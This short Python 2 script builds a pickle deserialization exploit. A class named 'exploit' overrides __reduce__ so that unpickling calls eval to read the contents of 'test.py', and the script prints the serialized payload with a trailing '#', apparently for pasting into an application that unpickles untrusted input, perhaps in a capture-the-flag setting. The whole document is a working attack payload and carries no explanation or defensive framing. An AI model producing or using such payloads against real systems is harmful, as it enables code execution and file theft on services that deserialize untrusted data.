from pickle import dumps, loads
import subprocess
import os

class exploit(object):
  def __reduce__(self):
    return (eval, ('open(\"test.py\").read()',))

print dumps(exploit())+"#"
